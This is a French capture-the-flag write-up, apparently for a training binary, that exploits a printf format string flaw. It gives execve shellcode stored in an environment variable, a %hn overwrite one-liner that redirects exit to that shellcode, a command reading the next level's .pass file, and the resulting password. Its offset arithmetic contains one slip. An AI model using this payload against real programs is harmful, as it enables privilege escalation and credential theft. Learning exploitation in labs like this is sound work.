# LEVEL05

## **Faille**

Nous sommes face a une `format string vunlerability`. Grâce à l'absence de formatteur dans printf, nous pouvons avoir accès a la stack en lecture (`%x`...) et en écriture (`%n`). Le but est de surcharger une variable pour rediriger un retour d'une fonction sur un `SHELL_CODE` custom. 

___
## **Solution**

[source](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf)

Nous utilisons une **variable d'environnement** pour stocker notre `SHELL_CODE` qu'on utiliseras pour acceder au pass.

    export SHELL_CODE=$(python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')


L'adresse du `SHELL_CODE` est `0xffffdece`, il faut donc remplacer l'adresse de retour du `exit(1)` par l'adresse de notre **variable d'environnement**

`0xffffdece` = `4294958798`, `4294958798` > `int max`, serait trop gros à écrire avec un `%d`, on ecrit donc deux octets par deux octets.

    ffff dece
    dece = 57038
    ffff = 65535 - 57038 = 8497 + 2 (pour les deux octets \xff\xff) = 8489

Étant en `little endian` , on écrit `dece` puis `ffff`.
Grace a wiremask, on trouve que l'offset est de 10, nous écrivons donc dans 10 et 11.

Pour les deux premiers octets, on vise le début de l'adresse cible `\x08\x04\x97\xe0` et nous écrivons `dece` puis `ffff`, deux octets plus loin, en `\x08\x04\x97\xe2`.

```bash
cat <(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] +"%57038d" +"%10$hn" + "%8489d" + "%11$hn")') - | ./level05
```

Nous sommes dans un shell avec les droits du niveau 6.

```bash
cat /home/users/level06/.pass
```

>> h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
